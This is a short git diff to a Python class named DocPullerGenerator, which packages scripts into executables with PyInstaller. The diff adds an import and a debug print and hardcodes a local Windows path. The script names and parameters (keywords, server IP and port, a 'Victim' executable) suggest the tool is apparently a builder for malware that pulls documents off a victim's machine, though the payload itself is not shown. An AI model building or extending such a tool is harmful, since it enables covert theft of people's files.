@@ -3,6 +3,8 @@ from tkinter import Tk
 from tkinter.filedialog import askdirectory
 import sys
 
+import PyInstaller as PyInstaller
+
 from Generator.Modoles.fronzen_objects_geneartor import FrozenObjectGeneartor
 
 
@@ -17,7 +19,7 @@ class DocPullerGenerator:
         self.keywords = keywords
         self.server_ip = server_ip
         self.server_port = server_port
-        self.DOCPULLER_USB_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerUSB_Exe.py'
+        self.DOCPULLER_USB_EXE_PATH = r'C:\Users\ibena\Documents\GitHub\DocPuller\Generator\DocPullerScriptsToExe\DocPullerUSB_Exe.py'
         self.DOCPULLER_FTP_SERVER_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerTCP_Server_Exe.py'
         self.DOCPULLER_FTP_VICTIM_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerTCP_Victim_Exe.py'
 
@@ -34,6 +36,8 @@ class DocPullerGenerator:
 
     def main(self):
         if self.is_usb:
+            print('genarating exe')
+
             command = ["pyinstaller", self.DOCPULLER_USB_EXE_PATH] + self.options
             subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    universal_newlines=True)
